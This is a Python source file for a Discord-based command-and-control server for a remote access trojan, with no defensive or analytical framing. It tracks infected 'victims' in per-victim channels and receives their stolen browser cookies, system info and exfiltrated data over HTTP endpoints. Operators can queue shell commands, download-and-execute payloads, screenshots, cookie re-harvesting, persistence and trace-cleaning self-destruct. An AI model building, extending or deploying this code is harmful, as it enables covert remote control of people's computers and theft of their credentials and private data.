import discord
from discord.ext import commands
from aiohttp import web
import asyncio
import json
import urllib.parse
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()  # reads .env if present
import os

# ============================================
# CONFIGURATION - FILL THESE IN
# ============================================
BOT_TOKEN = os.environ["DISCORD_TOKEN"]
GUILD_ID = int(os.environ["GUILD_ID"])
HTTP_PORT = 8080
# ============================================

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Track victims: {victim_id: {"channel_id": int, "hostname": str, ...}}
victims = {}
# Pending commands: {victim_id: [cmd1, cmd2, ...]}
pending_commands = {}

def get_guild():
    return bot.get_guild(GUILD_ID)

async def get_or_create_category():
    guild = get_guild()
    if not guild:
        print(f"ERROR: Bot not in guild {GUILD_ID}")
        return None
    
    for cat in guild.categories:
        if cat.name == "VICTIMS":
            return cat
    
    return await guild.create_category("VICTIMS")

async def get_or_create_victim_channel(victim_id, hostname, username):
    if victim_id in victims and victims[victim_id].get("channel_id"):
        guild = get_guild()
        channel = guild.get_channel(victims[victim_id]["channel_id"])
        if channel:
            return channel
    
    category = await get_or_create_category()
    if not category:
        return None
    
    safe_name = hostname.lower().replace(" ", "-")[:20]
    channel_name = f"v-{safe_name}-{username.lower()[:10]}"
    
    guild = get_guild()
    channel = await guild.create_text_channel(
        name=channel_name,
        category=category
    )
    
    victims[victim_id] = {
        "channel_id": channel.id,
        "hostname": hostname,
        "username": username,
        "first_seen": str(datetime.now()),
        "last_seen": str(datetime.now())
    }
    
    return channel

async def send_long_message(channel, content, prefix=""):
    if prefix:
        content = prefix + "\n" + content
    
    chunks = []
    while len(content) > 1900:
        split_at = content.rfind("\n", 0, 1900)
        if split_at == -1:
            split_at = 1900
        chunks.append(content[:split_at])
        content = content[split_at:]
    if content:
        chunks.append(content)
    
    for chunk in chunks:
        await channel.send(f"```\n{chunk}\n```")
        await asyncio.sleep(0.5)

# ============================================
# HTTP ENDPOINTS (RAT talks to these)
# ============================================

async def handle_checkin(request):
    try:
        data = await request.json()
    except:
        raw = await request.text()
        data = json.loads(urllib.parse.unquote(raw))
    
    victim_id = data.get("victim_id", "unknown")
    hostname = data.get("hostname", "unknown")
    username = data.get("username", "unknown")
    cookies = urllib.parse.unquote(data.get("cookies", ""))
    sysinfo = urllib.parse.unquote(data.get("sysinfo", ""))
    
    channel = await get_or_create_victim_channel(victim_id, hostname, username)
    if not channel:
        return web.Response(text="ERR_NO_GUILD")
    
    embed = discord.Embed(
        title="NEW VICTIM ONLINE",
        color=0xff0000,
        timestamp=datetime.now()
    )
    embed.add_field(name="Victim ID", value=f"`{victim_id}`", inline=False)
    embed.add_field(name="Hostname", value=hostname, inline=True)
    embed.add_field(name="Username", value=username, inline=True)
    embed.add_field(name="First Seen", value=str(datetime.now())[:19], inline=False)
    await channel.send(embed=embed)
    
    if sysinfo:
        await send_long_message(channel, sysinfo, prefix="=== SYSTEM INFO ===")
    
    if cookies:
        await send_long_message(channel, cookies, prefix="=== COOKIES ===")
    
    if victim_id not in pending_commands:
        pending_commands[victim_id] = []
    
    return web.Response(text="OK")

async def handle_exfil(request):
    try:
        data = await request.json()
    except:
        raw = await request.text()
        data = json.loads(urllib.parse.unquote(raw))
    
    victim_id = data.get("victim_id", "unknown")
    content = urllib.parse.unquote(data.get("content", ""))
    data_type = data.get("type", "generic")
    
    if victim_id in victims:
        guild = get_guild()
        channel = guild.get_channel(victims[victim_id]["channel_id"])
        if channel:
            victims[victim_id]["last_seen"] = str(datetime.now())
            header = f"=== {data_type.upper()} ==="
            await send_long_message(channel, content, prefix=header)
    
    return web.Response(text="OK")

async def handle_poll(request):
    try:
        data = await request.json()
    except:
        raw = await request.text()
        data = json.loads(urllib.parse.unquote(raw))
    
    victim_id = data.get("victim_id", "unknown")
    
    if victim_id in victims:
        victims[victim_id]["last_seen"] = str(datetime.now())
    
    if victim_id in pending_commands and len(pending_commands[victim_id]) > 0:
        cmd = pending_commands[victim_id].pop(0)
        return web.json_response({"command": cmd})
    
    return web.json_response({"command": ""})

async def handle_heartbeat(request):
    try:
        data = await request.json()
    except:
        raw = await request.text()
        data = json.loads(urllib.parse.unquote(raw))
    
    victim_id = data.get("victim_id", "unknown")
    if victim_id in victims:
        victims[victim_id]["last_seen"] = str(datetime.now())
    
    return web.Response(text="OK")

async def start_http():
    app = web.Application()
    app.router.add_post('/checkin', handle_checkin)
    app.router.add_post('/exfil', handle_exfil)
    app.router.add_post('/poll', handle_poll)
    app.router.add_post('/heartbeat', handle_heartbeat)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', HTTP_PORT)
    await site.start()
    print(f"[+] HTTP C2 server listening on port {HTTP_PORT}")

# ============================================
# DISCORD COMMANDS (you type these in victim channels)
# ============================================

@bot.event
async def on_ready():
    print(f"[+] Bot online: {bot.user}")
    print(f"[+] Guild: {get_guild()}")
    await start_http()

@bot.command(name="cmd")
async def run_command(ctx, *, command: str):
    """Execute shell command on victim. Usage: !cmd dir C:\\"""
    victim_id = find_victim_by_channel(ctx.channel.id)
    if not victim_id:
        await ctx.send("This is not a victim channel.")
        return
    
    pending_commands[victim_id].append(f"cmd:{command}")
    await ctx.send(f"Queued: `{command}`")

@bot.command(name="download")
async def download_exec(ctx, url: str, filename: str = "payload.exe"):
    """Download and execute file. Usage: !download http://url/file.exe name.exe"""
    victim_id = find_victim_by_channel(ctx.channel.id)
    if not victim_id:
        await ctx.send("This is not a victim channel.")
        return
    
    pending_commands[victim_id].append(f"download:{url}:{filename}")
    await ctx.send(f"Queued download: `{url}` -> `{filename}`")

@bot.command(name="screenshot")
async def take_screenshot(ctx):
    """Take screenshot. Usage: !screenshot"""
    victim_id = find_victim_by_channel(ctx.channel.id)
    if not victim_id:
        await ctx.send("This is not a victim channel.")
        return
    
    pending_commands[victim_id].append("screenshot")
    await ctx.send("Queued screenshot capture")

@bot.command(name="cookies")
async def steal_cookies(ctx):
    """Force re-harvest cookies. Usage: !cookies"""
    victim_id = find_victim_by_channel(ctx.channel.id)
    if not victim_id:
        await ctx.send("This is not a victim channel.")
        return
    
    pending_commands[victim_id].append("cookies")
    await ctx.send("Queued cookie harvest")

@bot.command(name="persist")
async def toggle_persistence(ctx):
    """Re-establish persistence. Usage: !persist"""
    victim_id = find_victim_by_channel(ctx.channel.id)
    if not victim_id:
        await ctx.send("This is not a victim channel.")
        return
    
    pending_commands[victim_id].append("persist")
    await ctx.send("Queued persistence re-establishment")

@bot.command(name="selfdestruct")
async def self_destruct(ctx):
    """Kill RAT and clean traces. Usage: !selfdestruct"""
    victim_id = find_victim_by_channel(ctx.channel.id)
    if not victim_id:
        await ctx.send("This is not a victim channel.")
        return
    
    pending_commands[victim_id].append("selfdestruct")
    await ctx.send("Queued self-destruct")

@bot.command(name="victims")
async def list_victims(ctx):
    """List all active victims. Usage: !victims"""
    if not victims:
        await ctx.send("No active victims.")
        return
    
    embed = discord.Embed(title="Active Victims", color=0x00ff00)
    for vid, vdata in victims.items():
        embed.add_field(
            name=f"{vdata['hostname']} / {vdata['username']}",
            value=f"ID: `{vid}`\nLast seen: {vdata['last_seen'][:19]}",
            inline=False
        )
    await ctx.send(embed=embed)

@bot.command(name="help2")
async def help_custom(ctx):
    """Show RAT commands"""
    help_text = """
**RAT Commands:**
`!cmd <command>` - Run shell command
`!download <url> <filename>` - Download & execute
`!screenshot` - Capture screen
`!cookies` - Re-harvest browser cookies
`!persist` - Re-establish persistence
`!selfdestruct` - Kill RAT, clean traces
`!victims` - List all victims
    """
    await ctx.send(help_text)

def find_victim_by_channel(channel_id):
    for vid, vdata in victims.items():
        if vdata.get("channel_id") == channel_id:
            return vid
    return None

# ============================================
# RUN
# ============================================
if __name__ == "__main__":
    print("[*] Starting C2 Bot...")
    print(f"[*] Guild ID: {GUILD_ID}")
    print(f"[*] HTTP Port: {HTTP_PORT}")
    bot.run(BOT_TOKEN)